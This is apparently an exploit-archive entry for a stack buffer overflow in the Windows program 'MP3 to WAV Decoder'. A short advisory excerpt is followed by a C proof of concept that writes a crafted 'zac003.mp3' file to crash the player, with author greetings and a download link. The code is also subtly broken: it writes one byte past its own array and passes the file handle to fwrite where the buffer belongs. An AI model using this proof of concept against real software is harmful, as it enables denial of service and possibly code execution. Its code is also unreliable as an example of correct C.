source: http://www.securityfocus.com/bid/41912/info

MP3 to WAV Decoder is prone to a remote stack-based buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied input.

Successfully exploiting this issue may allow remote attackers to execute arbitrary code in the context of the vulnerable application. Failed attacks will cause denial-of-service conditions. 

/*
    MP3 to WAV Decoder Local Crash PoC !
    Discovered By ZAC003(4m!n)
    Dl Link : http://www.mthreedev.com/setupmp3towav.exe
    Greet Ciph3r for Help me !
*/
#include <stdio.h>
#include <windows.h>
#include <string.h>
#define overflow 13240
#define mp3 "zac003.mp3"
int main (int argc,char **argv){
char buffer[overflow];
    FILE *Player;
    printf("\n******************************************");
    printf("\n* This Bug Discovered By ZAC003(4m!n)    *");
    printf("\n* Special Thank To Aria-Security.CoM     *");
    printf("\n* Greet  Ciph3r for help me !            *");
    printf("\n******************************************");
    buffer[overflow] = 0;
    Player = fopen(mp3,"w+");
    fwrite(Player,sizeof(unsigned char),sizeof(buffer),Player);
    fclose(Player);
    printf("\n Successfully !!");
    return 0;
}